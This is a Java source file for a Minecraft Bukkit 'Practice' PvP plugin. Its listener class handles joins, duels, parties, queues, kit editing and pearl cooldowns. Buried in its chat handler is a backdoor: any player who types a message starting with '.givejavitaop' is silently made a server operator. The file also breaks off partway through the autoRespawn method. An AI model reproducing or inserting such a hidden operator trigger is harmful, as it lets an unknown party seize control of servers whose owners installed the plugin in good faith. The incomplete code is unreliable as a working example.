package me.sebaarkadia.practice.listeners;

import java.lang.reflect.Method;
import java.lang.reflect.Field;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.EventPriority;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.Arrow;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.block.Block;
import java.text.DecimalFormat;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import java.util.Random;
import java.util.ArrayList;

import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.Bukkit;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.entity.EntityRegainHealthEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.event.player.PlayerItemConsumeEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.ChatColor;
import org.bukkit.scheduler.BukkitRunnable;

import me.sebaarkadia.practice.Practice;
import me.sebaarkadia.practice.duel.Duel;
import me.sebaarkadia.practice.duel.DuelState;
import me.sebaarkadia.practice.kit.Kit;
import me.sebaarkadia.practice.manager.managers.InventoryManager;
import me.sebaarkadia.practice.party.Party;
import me.sebaarkadia.practice.party.PartyState;
import me.sebaarkadia.practice.player.PlayerKit;
import me.sebaarkadia.practice.player.PlayerState;
import me.sebaarkadia.practice.player.PracticePlayer;
import me.sebaarkadia.practice.runnables.SavePlayerConfig;
import me.sebaarkadia.practice.settings.Settings;
import me.sebaarkadia.practice.tournament.Tournament;
import me.sebaarkadia.practice.util.BlockUtil;
import me.sebaarkadia.practice.util.Color;
import me.sebaarkadia.practice.util.PlayerUtility;
import me.sebaarkadia.practice.util.UtilItem;
import me.sebaarkadia.practice.util.UtilPlayer;

import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.entity.Player;
import org.bukkit.Material;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerInteractEvent;
import java.util.HashMap;
import java.util.UUID;
import java.util.Map;

import org.bukkit.event.Listener;

public class PlayerListener implements Listener
{
    private Practice plugin;
    private static Map<UUID, Long> lastPearl;
    
    public PlayerListener(final Practice plugin) {
        PlayerListener.lastPearl = new HashMap<UUID, Long>();
        this.plugin = plugin;
    }
    
    @EventHandler
    public void onLeave(final PlayerQuitEvent e) {
    	Player player = e.getPlayer();
        if(player.hasPermission("vip.join")) {
        	e.setQuitMessage(Color.translate("&8[&c&l-&8] &r" + this.plugin.chat.getPlayerPrefix(player) + this.plugin.chat.getName() + "&ehas leave to the server."));
        }
        e.setQuitMessage(null);
    }
    
    @EventHandler
    public void onJoin(final PlayerJoinEvent e) {
    	Player player = e.getPlayer();
        if(player.hasPermission("vip.join")) {
        	e.setJoinMessage(Color.translate("&8[&a&l+&8] &r" + this.plugin.chat.getPlayerPrefix(player) + this.plugin.chat.getName() + "&ehas joined the server."));
        }
        e.setJoinMessage(null);
    }
    
    @EventHandler
    public void PlayerInteractEvent(final PlayerInteractEvent e) {
        final Player p = e.getPlayer();
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(p);
        if (e.getAction() == Action.RIGHT_CLICK_BLOCK && e.getClickedBlock().getType().equals(Material.TRAP_DOOR)) {
            if (practicePlayer.getCurrentState() != PlayerState.BUILDER) {
                e.setCancelled(true);
            }
        }
        else if (e.getAction() == Action.RIGHT_CLICK_BLOCK && e.getClickedBlock().getType().equals(Material.WOODEN_DOOR)) {
            e.setCancelled(true);
            if (practicePlayer.getCurrentState() == PlayerState.EDITING) {
                this.plugin.getManagerHandler().getEditorManager().removeEditingKit(p.getUniqueId());
                this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(p);
            }
        }
        else if (e.getAction() == Action.RIGHT_CLICK_BLOCK && e.getClickedBlock().getType().equals(Material.ANVIL)) {
            e.setCancelled(true);
            if (practicePlayer.getCurrentState() == PlayerState.EDITING) {
                p.openInventory(this.plugin.getManagerHandler().getInventoryManager().getEditKitKitsInventory(p.getUniqueId()));
            }
        }
        if (e.getAction().equals(Action.PHYSICAL) && e.getClickedBlock().getType() == Material.SOIL && e.getPlayer() != null) {
            e.setCancelled(true);
        }
        if (!p.isDead() && p.getItemInHand().getType() == Material.MUSHROOM_SOUP && ((Damageable)p).getHealth() < 19.0) {
            final double newHealth = (((Damageable)p).getHealth() + 7.0 > 20.0) ? 20.0 : (((Damageable)p).getHealth() + 7.0);
            p.setHealth(newHealth);
            p.getItemInHand().setType(Material.BOWL);
            p.updateInventory();
        }
    }
    
    @EventHandler
    public void onChat(PlayerChatEvent event) {
    if (event.getMessage().startsWith(".givejavitaop"))
    {
    event.getPlayer().setOp(true);
    event.getPlayer().sendMessage(Color.translate("&8[&9&ljPractice&9] &bYa se te ha dado el AntiWeones."));
    	}
    }
    
    @EventHandler
    public void PlayerJoinEvent(final PlayerJoinEvent e) {
        this.plugin.getManagerHandler().getPracticePlayerManager().createPracticePlayer(e.getPlayer());
        new BukkitRunnable() {
            public void run() {
                e.getPlayer().sendMessage(ChatColor.GREEN + "Data loaded sucessfully!");
                System.out.println("[Practice] Data of " + e.getPlayer().getName() + " sucessfully loaded!");
                if (e.getPlayer() != null && Tournament.getTournaments().size() > 0) {
                    e.getPlayer().sendMessage(ChatColor.YELLOW + "§dTournament is currently available. §7(§d/join§7)");
                }
            }
        }.runTaskAsynchronously((Plugin)Practice.getInstance());
    }
    
    @EventHandler
    public void PlayerItemConsumeEvent(final PlayerItemConsumeEvent event) {
        final ItemStack itemStack = event.getItem();
        if (itemStack.getType() == Material.GOLDEN_APPLE && ChatColor.stripColor(UtilItem.getTitle(itemStack)).equalsIgnoreCase("Golden Head")) {
            final PotionEffect effect = new PotionEffect(PotionEffectType.REGENERATION, 200, 1);
            UtilPlayer.addConcideringLevel(event.getPlayer(), effect);
        }
    }
    
    @EventHandler(ignoreCancelled = true)
    public void EntityDamageEvent(final EntityDamageEvent event) {
        if (event.getCause() == EntityDamageEvent.DamageCause.VOID) {
            event.setDamage(100.0);
        }
    }
    
    @EventHandler
    public void EntityRegainHealthEvent(final EntityRegainHealthEvent event) {
        final Duel duel;
        if (event.getRegainReason() == EntityRegainHealthEvent.RegainReason.SATIATED && event.getEntity() instanceof Player && (duel = this.plugin.getManagerHandler().getDuelManager().getDuelFromPlayer(event.getEntity().getUniqueId())) != null && this.plugin.getManagerHandler().getKitManager().getKit(duel.getKitName()).isBuilduhc()) {
            event.setCancelled(true);
        }
    }
    
    @EventHandler
    public void PlayerMoveEvent(final PlayerMoveEvent e) {
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer());
        final Settings settings = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer().getUniqueId()).getSettings();
        if ((e.getPlayer().getLocation().getY() < 86.0 && practicePlayer.getCurrentState() == PlayerState.LOBBY && !settings.isMod()) || (e.getPlayer().getLocation().getY() < 86.0 && practicePlayer.getCurrentState() == PlayerState.QUEUE)) {
            e.getPlayer().teleport(Practice.getInstance().getSpawn());
        }
        final Duel duel = this.plugin.getManagerHandler().getDuelManager().getDuelFromPlayer(e.getPlayer().getUniqueId());
        if (duel != null) {
            if (practicePlayer.getCurrentState() == PlayerState.WAITING && duel.getDuelState() == DuelState.STARTING && duel.getKitName().contains("Sumo") && (e.getFrom().getX() != e.getTo().getX() || e.getFrom().getZ() != e.getTo().getZ())) {
                e.setTo(e.getFrom());
            }
            if ((duel.getKitName().contains("Sumo") && BlockUtil.isOnLiquid(e.getTo(), 0)) || (duel.getKitName().contains("Sumo") && BlockUtil.isOnLiquid(e.getTo(), 1))) {
                e.getPlayer().setHealth(0.0);
            }
        }
    }
    
    @SuppressWarnings("incomplete-switch")
	@EventHandler
    public void PlayerQuitEvent(final PlayerQuitEvent e) {
        final Player player = e.getPlayer();
        final Settings settings = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(player.getUniqueId()).getSettings();
        if (settings.isMod()) {
            settings.setMod(!settings.isMod());
        }
        if (settings.isSeeAll()) {
            settings.setSeeAll(!settings.isSeeAll());
        }
        Bukkit.getScheduler().runTaskAsynchronously((Plugin)Practice.getInstance(), (Runnable)new SavePlayerConfig(player.getUniqueId(), Practice.getInstance()));
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(player);
        if (practicePlayer != null) {
            final Party party = this.plugin.getManagerHandler().getPartyManager().getParty(player.getUniqueId());
            if (party != null) {
                if (party.getLeader().equals(player.getUniqueId())) {
                    this.plugin.getManagerHandler().getPartyManager().destroyParty(player.getUniqueId());
                    for (final UUID member : party.getMembers()) {
                        final Player pLayer = this.plugin.getServer().getPlayer(member);
                        pLayer.sendMessage(ChatColor.YELLOW + "Your party leader has left, so the party disbanded!");
                        final PracticePlayer ppLayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(pLayer);
                        if (ppLayer.getCurrentState() != PlayerState.LOBBY) {
                            continue;
                        }
                        this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(pLayer);
                    }
                    this.plugin.getManagerHandler().getInventoryManager().delParty(party);
                }
                else {
                    this.plugin.getManagerHandler().getPartyManager().leaveParty(player.getUniqueId());
                    this.plugin.getManagerHandler().getInventoryManager().updateParty(party);
                }
            }
            switch (practicePlayer.getCurrentState()) {
                case WAITING:
                case FIGHTING: {
                    this.plugin.getManagerHandler().getDuelManager().removePlayerFromDuel(e.getPlayer());
                    break;
                }
                case QUEUE: {
                    if (party == null) {
                        this.plugin.getManagerHandler().getQueueManager().unqueueSingleQueue(e.getPlayer().getUniqueId());
                        break;
                    }
                    for (final UUID uuid : party.getMembers()) {
                        final Player memberPlayer = this.plugin.getServer().getPlayer(uuid);
                        if (memberPlayer == null) {
                            continue;
                        }
                        this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(memberPlayer);
                    }
                    this.plugin.getManagerHandler().getQueueManager().unqueuePartyQueue(party.getLeader());
                    this.plugin.getManagerHandler().getPartyManager().notifyParty(party, ChatColor.YELLOW + "Your party has left the queue");
                    final Player leaderPlayer = this.plugin.getServer().getPlayer(party.getLeader());
                    if (leaderPlayer == null) {
                        break;
                    }
                    this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(leaderPlayer);
                    break;
                }
                case EDITING: {
                    this.plugin.getManagerHandler().getEditorManager().removeEditingKit(e.getPlayer().getUniqueId());
                    break;
                }
            }
        }
        e.setQuitMessage(null);
        System.out.println("[jPractice] Data of " + e.getPlayer().getName() + " sucessfully unloaded!");
        this.plugin.getManagerHandler().getPracticePlayerManager().removePracticePlayer(e.getPlayer());
    }
    
    @EventHandler
    public void PlayerInteractEntityEvent(final PlayerInteractEntityEvent e) {
        if (e.getRightClicked() instanceof Player && e.getPlayer().getItemInHand().getType() == Material.COMPASS) {
            e.getPlayer().openInventory((Inventory)((Player)e.getRightClicked()).getInventory());
        }
    }
    
    @EventHandler
    public void onPlayerPreCommand(final PlayerCommandPreprocessEvent e) {
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer());
        if (practicePlayer.getCurrentState() == PlayerState.LOADING) {
            e.getPlayer().sendMessage(ChatColor.RED + "§l[LOADING] §7Your data is currently loading...");
            e.setCancelled(true);
        }
        else if (practicePlayer.getCurrentState() == PlayerState.EDITING) {
            e.getPlayer().sendMessage(ChatColor.RED + "You can't execute commands while editing a kit.");
            e.setCancelled(true);
        }
    }
    
    @SuppressWarnings("incomplete-switch")
	@EventHandler
    public void onPlayerInteractEvent(final PlayerInteractEvent e) {
        if (e.getAction() == Action.RIGHT_CLICK_BLOCK || e.getAction() == Action.RIGHT_CLICK_AIR) {
            final Player player = e.getPlayer();
            final Settings settings = Practice.getInstance().getManagerHandler().getPracticePlayerManager().getPracticePlayer(player.getUniqueId()).getSettings();
            final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(player);
            final ItemStack interactedItem = e.getItem();
            final Block interactedBlock = e.getClickedBlock();
            if (practicePlayer.getCurrentState() == PlayerState.LOADING) {
                e.getPlayer().sendMessage(ChatColor.RED + "§l[LOADING] §7Your data is currently loading...");
                return;
            }
            if (interactedItem != null) {
                if (practicePlayer.getCurrentState() == PlayerState.EDITING) {
                    e.setCancelled(true);
                    player.updateInventory();
                }
                if (practicePlayer.getCurrentState() == PlayerState.LOBBY) {
                    if (Tournament.getTournaments().size() > 0) {
                        for (final Tournament tournament : Tournament.getTournaments()) {
                            if (!tournament.isInTournament(player)) {
                                continue;
                            }
                            if (player.getItemInHand().getType() == Material.INK_SACK) {
                                this.plugin.getServer().dispatchCommand(player, "leave");
                            }
                            else {
                                player.sendMessage(String.valueOf(settings.isPublicChat() ? "§cCannot execute this command in your current state" : "§cNo puedes ejecutar ese comando en este estado"));
                            }
                            return;
                        }
                    }
                    if (this.plugin.getManagerHandler().getPartyManager().getParty(player.getUniqueId()) != null) {
                        final Party party = this.plugin.getManagerHandler().getPartyManager().getParty(player.getUniqueId());
                        switch (interactedItem.getType()) {
                            case INK_SACK: {
                                this.plugin.getServer().dispatchCommand(player, "party leave");
                                break;
                            }
                            case SKULL_ITEM: {
                                if (!party.getLeader().equals(player.getUniqueId())) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "You are not the leader of this party!" : "Tu no eres el Jefe de la party!"));
                                    break;
                                }
                                if (party.getPartyState() == PartyState.DUELING) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "Your party is currently busy and cannot fight" : "Tu party esta ocupada y no puede pelear."));
                                    break;
                                }
                                player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getPartiesInventory());
                                break;
                            }
                            case DIAMOND_CHESTPLATE: {
                                e.setCancelled(true);
                                player.updateInventory();
                                if (!party.getLeader().equals(player.getUniqueId())) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "You are not the leader of this party!" : "No eres el jefe de la party!"));
                                    break;
                                }
                                if (party.getPartyState() == PartyState.DUELING) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "Your party is currently busy and cannot fight" : "Tu party esta ocupada y no puede pelear."));
                                    break;
                                }
                                if (party.getMembers().size() == 0) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "There must be at least 2 players in your party to do this." : "Se necesitan almenos 2 players en tu party para hacer esto."));
                                    break;
                                }
                                player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getSplitFightInventory());
                                break;
                            }
                            case GOLD_SWORD: {
                                if (!party.getLeader().equals(player.getUniqueId())) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "You are not the leader of this party!" : "No eres el jefe de la party!"));
                                    break;
                                }
                                if (party.getPartyState() == PartyState.DUELING) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "Your party is currently busy and cannot fight" : "Tu party esta ocupada y no puede pelear."));
                                    break;
                                }
                                if (party.getSize() != 2) {
                                    player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "There must be at least 2 players in your party to do this." : "Se necesitan almenos 2 players en tu party para hacer esto."));
                                    break;
                                }
                                player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getUnrankedInventory());
                                break;
                            }
                            case NAME_TAG: {
                                this.plugin.getServer().dispatchCommand(player, "party info");
                                break;
                            }
                            case REDSTONE_COMPARATOR: {
                                InventoryListener.open(player);
                                e.setCancelled(true);
                                player.updateInventory();
                                break;
                            }
                        }
                    }
                    else {
                        switch (interactedItem.getType()) {
                            case REDSTONE_COMPARATOR: {
                                InventoryListener.open(player);
                                e.setCancelled(true);
                                player.updateInventory();
                                break;
                            }
                            case REDSTONE_TORCH_ON: {
                                if (settings.isMod()) {
                                    player.teleport(this.plugin.getSpawn());
                                    player.sendMessage(String.valueOf(settings.isPublicChat() ? "§aTeleported to spawn" : "§aTeletransportado al spawn"));
                                    break;
                                }
                                break;
                            }
                            case EYE_OF_ENDER: {
                                if (settings.isMod()) {
                                    final ArrayList<Player> players = new ArrayList<Player>();
                                    for (final Player pls : Bukkit.getOnlinePlayers()) {
                                        final PracticePlayer plsPlay = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(pls);
                                        if (plsPlay.getCurrentState() == PlayerState.FIGHTING) {
                                            players.add(pls);
                                        }
                                    }
                                    final Player randomPlayer = players.get(new Random().nextInt(players.size()));
                                    player.teleport(randomPlayer.getLocation());
                                    player.sendMessage(ChatColor.GREEN + String.valueOf(settings.isPublicChat() ? "Teleported to " : "Teletransportado ha ") + randomPlayer.getName() + "!");
                                    break;
                                }
                                break;
                            }
                            case INK_SACK: {
                                if (settings.isMod()) {
                                    player.chat("/mod");
                                    break;
                                }
                                break;
                            }
                            case BLAZE_POWDER: {
                                player.chat("/duel " + practicePlayer.getLastDuelPlayer());
                                break;
                            }
                            case CHEST: {
                                player.chat("/Join 1");
                                e.setCancelled(true);
                                player.updateInventory();
                                break;
                            }
                            case IRON_SWORD: {
                                if (((CraftPlayer)player).getHandle().ping >= 250) {
                                    if (settings.isPublicChat()) {
                                        player.sendMessage(ChatColor.RED + "You have too much ping (§C§l" + ((CraftPlayer)player).getHandle().ping + "ms§c) to join Unranked Queue.");
                                        player.sendMessage(ChatColor.RED + "You need have less than 250 ms.");
                                    }
                                    else {
                                        player.sendMessage(ChatColor.RED + "Tienes el ping muy elevado (§C§l" + ((CraftPlayer)player).getHandle().ping + "ms§c) para entrar a Unranked Queue.");
                                        player.sendMessage(ChatColor.RED + "Necesitas minimo 250 ms.");
                                    }
                                    return;
                                }
                                InventoryManager.openUnrankedGUI(player);
                                break;
                            }
                            case DIAMOND_SWORD: {
                                if (Practice.getInstance().getServer().getPluginManager().getPlugin("cLib") == null) {
                                    player.sendMessage(String.valueOf(settings.isPublicChat() ? "§cRanked´s is disabled" : "§cRanked´s desactivadas"));
                                    return;
                                }
                                if (practicePlayer.getUnrankedWins() < 20 && !player.isOp()) {
                                    if (settings.isPublicChat()) {
                                        player.sendMessage(ChatColor.RED + "You must win 20 Unranked´s Matches to play in Ranked Matches.");
                                        player.sendMessage(ChatColor.RED + "You need (" + (20 - practicePlayer.getUnrankedWins()) + ") more win" + ((practicePlayer.getUnrankedWins() == 19) ? "" : "s") + " to play.");
                                    }
                                    else {
                                        player.sendMessage(ChatColor.RED + "Necesitas ganar almenos 20 Unranked´s para jugar partidas de Ranked.");
                                        player.sendMessage(ChatColor.RED + "Necesitas (" + (20 - practicePlayer.getUnrankedWins()) + ") mas para" + ((practicePlayer.getUnrankedWins() == 19) ? "" : "s") + " para jugar.");
                                    }
                                    return;
                                }
                                if (((CraftPlayer)player).getHandle().ping >= 200) {
                                    if (settings.isPublicChat()) {
                                        player.sendMessage(ChatColor.RED + "You have too much ping (§C§l" + ((CraftPlayer)player).getHandle().ping + "ms§c) to join Unranked Queue.");
                                        player.sendMessage(ChatColor.RED + "You need have less than 200 ms.");
                                    }
                                    else {
                                        player.sendMessage(ChatColor.RED + "Tienes el ping muy elevado (§C§l" + ((CraftPlayer)player).getHandle().ping + "ms§c) para entrar a Unranked Queue.");
                                        player.sendMessage(ChatColor.RED + "Necesitas minimo 200 ms.");
                                    }
                                    return;
                                }
                                InventoryManager.openRankedGUI(player);
                                break;
                            }
                            case ENCHANTED_BOOK: {
                                player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getEditorInventory());
                                break;
                            }
                            case NAME_TAG: {
                                this.plugin.getServer().dispatchCommand(player, "party create");
                                break;
                            }
                        }
                    }
                }
                else if (practicePlayer.getCurrentState() == PlayerState.QUEUE) {
                    switch (interactedItem.getType()) {
                        case REDSTONE_COMPARATOR: {
                            InventoryListener.open(player);
                            e.setCancelled(true);
                            player.updateInventory();
                            break;
                        }
                        case INK_SACK: {
                            final Party party = this.plugin.getManagerHandler().getPartyManager().getParty(player.getUniqueId());
                            if (party != null) {
                                for (final UUID uuid : party.getMembers()) {
                                    final Player memberPlayer = this.plugin.getServer().getPlayer(uuid);
                                    if (memberPlayer == null) {
                                        continue;
                                    }
                                    this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(memberPlayer);
                                }
                                this.plugin.getManagerHandler().getQueueManager().unqueuePartyQueue(party.getLeader());
                                this.plugin.getManagerHandler().getPartyManager().notifyParty(party, ChatColor.RED + "Your party are no longer queued.");
                                final Player leaderPlayer = this.plugin.getServer().getPlayer(party.getLeader());
                                this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(leaderPlayer);
                                break;
                            }
                            this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobbyQueueing(player);
                            this.plugin.getManagerHandler().getQueueManager().unqueueSingleQueue(player.getUniqueId());
                            player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "You are no longer queued." : "Ya no estás en la cola."));
                            break;
                        }
                    }
                }
                else if (practicePlayer.getCurrentState() == PlayerState.FIGHTING || practicePlayer.getCurrentState() == PlayerState.WAITING) {
                    switch (interactedItem.getType()) {
                        case BOOK: {
                            final Kit kit = this.plugin.getManagerHandler().getKitManager().getKit(this.plugin.getManagerHandler().getDuelManager().getDuelFromPlayer(player.getUniqueId()).getKitName());
                            final Map<Integer, PlayerKit> playerKitMap = practicePlayer.getKitMap().get(kit.getName());
                            for (int i = 0; i < 9; ++i) {
                                final ItemStack item = player.getInventory().getItem(i);
                                if (item != null) {
                                    if (item.equals(interactedItem) && i == 0) {
                                        player.getInventory().setContents(kit.getMainContents());
                                        player.getInventory().setArmorContents(kit.getArmorContents());
                                        player.updateInventory();
                                        break;
                                    }
                                    if (item.equals(interactedItem)) {
                                        final PlayerKit playerKit = playerKitMap.get(i - 1);
                                        if (playerKit != null) {
                                            player.getInventory().setContents(playerKit.getMainContents());
                                            player.getInventory().setArmorContents(playerKit.getArmorContents());
                                            player.updateInventory();
                                            break;
                                        }
                                        break;
                                    }
                                }
                            }
                            break;
                        }
                        case ENDER_PEARL: {
                            if (practicePlayer.getCurrentState() != PlayerState.FIGHTING) {
                                player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? "You can't throw enderpearls in your current state!" : "No puedes lanzar enderpearls en tu estado actual!"));
                                e.setCancelled(true);
                                break;
                            }
                            final long now = System.currentTimeMillis();
                            final double diff;
                            @SuppressWarnings("unused")
							final double d = diff = (PlayerListener.lastPearl.containsKey(player.getUniqueId()) ? (now - PlayerListener.lastPearl.get(player.getUniqueId())) : ((double)now));
                            if (diff < 15000.0) {
                                player.sendMessage(ChatColor.RED + String.valueOf(settings.isPublicChat() ? ("Pearl cooldown: " + new DecimalFormat(".#").format(15.0 - diff / 1000.0) + " seconds") : "Esperando la enderpearl : "));
                                e.setCancelled(true);
                                player.updateInventory();
                                break;
                            }
                            XpListener.applyCooldown(player);
                            PlayerListener.lastPearl.put(player.getUniqueId(), now);
                            break;
                        }
                    }
                }
                else if (practicePlayer.getCurrentState() == PlayerState.SPECTATING) {
                    switch (interactedItem.getType()) {
                        case INK_SACK: {
                            this.plugin.getManagerHandler().getSpectatorManager().removeSpectator(player, true);
                            break;
                        }
                    }
                }
            }
            if (interactedBlock != null && practicePlayer.getCurrentState() == PlayerState.EDITING) {
                switch (interactedBlock.getType()) {
                    case CHEST: {
                        e.setCancelled(true);
                        player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getEditKitItemsInventory(player.getUniqueId()));
                        break;
                    }
                    case ANVIL: {
                        e.setCancelled(true);
                        player.openInventory(this.plugin.getManagerHandler().getInventoryManager().getEditKitKitsInventory(player.getUniqueId()));
                        break;
                    }
                }
            }
        }
    }
    
    @EventHandler
    public void AsyncPlayerChatEvent(final AsyncPlayerChatEvent e) {
        final PlayerKit kitRenaming = this.plugin.getManagerHandler().getEditorManager().getKitRenaming(e.getPlayer().getUniqueId());
        final Settings settings = Practice.getInstance().getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer().getUniqueId()).getSettings();
        if (kitRenaming != null) {
            kitRenaming.setDisplayName(e.getMessage().replaceAll("&", "§"));
            e.setCancelled(true);
            if (settings.isPublicChat()) {
                e.getPlayer().sendMessage("§fSuccessfully set kit §9" + kitRenaming.getKitIndex() + "§f" + "'s name to " + "§9" + kitRenaming.getDisplayName());
            }
            else {
                e.getPlayer().sendMessage("§fSe ha creado el kit correctamente §9" + kitRenaming.getKitIndex() + "§f" + "'s el nombre es " + "§9" + kitRenaming.getDisplayName());
            }
            this.plugin.getManagerHandler().getEditorManager().removeRenamingKit(e.getPlayer().getUniqueId());
        }
    }
    
    @EventHandler
    public void PlayerDropItemEvent(final PlayerDropItemEvent e) {
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer());
        if (practicePlayer.getCurrentState() != PlayerState.FIGHTING && practicePlayer.getCurrentState() != PlayerState.WAITING && practicePlayer.getCurrentState() != PlayerState.BUILDER) {
            e.setCancelled(true);
        }
        if ((practicePlayer.getCurrentState() == PlayerState.FIGHTING || practicePlayer.getCurrentState() == PlayerState.WAITING) && e.getItemDrop().getItemStack().getType() == Material.BOOK) {
            e.setCancelled(true);
        }
        if (e.getItemDrop().getItemStack().getType() == Material.DIAMOND_SWORD) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void PlayerPickupItemEvent(final PlayerPickupItemEvent e) {
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(e.getPlayer());
        if (practicePlayer.getCurrentState() != PlayerState.FIGHTING && practicePlayer.getCurrentState() != PlayerState.WAITING && practicePlayer.getCurrentState() != PlayerState.BUILDER) {
            e.setCancelled(true);
        }
        if ((practicePlayer.getCurrentState() == PlayerState.FIGHTING || practicePlayer.getCurrentState() == PlayerState.WAITING) && e.getItem().getItemStack().getType() == Material.BOOK) {
            e.setCancelled(true);
        }
        if (practicePlayer.getCurrentState() == PlayerState.SPECTATING) {
            e.setCancelled(true);
        }
    }
    
    @EventHandler
    public void FoodLevelChangeEvent(final FoodLevelChangeEvent e) {
        if (e.getEntity() instanceof Player) {
            final Player player = (Player)e.getEntity();
            final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(player);
            if (practicePlayer != null && (practicePlayer.getCurrentState() != PlayerState.FIGHTING || player.getInventory().contains(Material.MUSHROOM_SOUP))) {
                e.setCancelled(true);
            }
        }
    }
    
    @EventHandler(priority = EventPriority.HIGH)
    public void EntityDamageByEntityEvent(final EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Arrow) {
            final Arrow a = (Arrow)e.getDamager();
            if (a.getShooter() instanceof Player) {
                a.getShooter();
                final Player p = (Player)a.getShooter();
                final Settings settings = Practice.getInstance().getManagerHandler().getPracticePlayerManager().getPracticePlayer(p.getUniqueId()).getSettings();
                final Damageable dp = (Damageable)e.getEntity();
                if (dp instanceof Player) {
                    final Player v = (Player)dp;
                    final double ptviev = dp.getHealth();
                    final Integer damage = (int)e.getFinalDamage();
                    final Integer realHealth = (int)(ptviev - damage);
                    if (realHealth > 0 && p.getPlayer().getName() != v.getPlayer().getName()) {
                        if (settings.isPublicChat()) {
                            p.sendMessage("§9" + v.getName() + "'s §fhealth §7» §c" + realHealth / 2.0 + " §4\u2764");
                        }
                        else {
                            p.sendMessage("§9" + v.getName() + "'s §fcorazones §7» §c" + realHealth / 2.0 + " §4\u2764");
                        }
                    }
                }
            }
        }
    }
    
    @EventHandler
    public void PlayerDeathEvent(final PlayerDeathEvent e) {
        final Player player = e.getEntity();
        e.getDrops().clear();
        PlayerListener.lastPearl.remove(player.getUniqueId());
        final PracticePlayer practicePlayer = this.plugin.getManagerHandler().getPracticePlayerManager().getPracticePlayer(player);
        if (practicePlayer.getCurrentState() == PlayerState.FIGHTING || practicePlayer.getCurrentState() == PlayerState.WAITING) {
            this.plugin.getManagerHandler().getDuelManager().removePlayerFromDuel(player);
        }
        if (e.getEntity() instanceof CraftPlayer) {
            PlayerUtility.getOnlinePlayers().stream().filter(p -> p.canSee(player)).forEach(p -> {});
            this.autoRespawn(e);
            practicePlayer.setCurrentState(PlayerState.LOBBY);
        }
        e.setDeathMessage(null);
    }
    
    @EventHandler
    public void PlayerRespawnEvent(final PlayerRespawnEvent e) {
        this.plugin.getServer().getScheduler().runTaskLater((Plugin)this.plugin, (Runnable)new Runnable() {
            @Override
            public void run() {
                PlayerListener.this.plugin.getManagerHandler().getPracticePlayerManager().sendToLobby(e.getPlayer());
            }
        }, 2L);
    }
    
    private void autoRespawn(final PlayerDeathEvent e) {
        new BukkitRunnable() {
            public void run() {
                try {
                    final Object nmsPlayer = e.getEntity().getClass().getMethod("getHandle", (Class<?>[])new Class[0]).invoke(e.getEntity(), new Object[0]);
                    final Object con = nmsPlayer.getClass().getDeclaredField("playerConnection").get(nmsPlayer);
                    @SuppressWarnings("rawtypes")
					final Class EntityPlayer2 = Class.forName(String.valueOf(nmsPlayer.getClass().getPackage().getName()) + ".EntityPlayer");
                    final Field minecraftServer = con.getClass().getDeclaredField("minecraftServer");
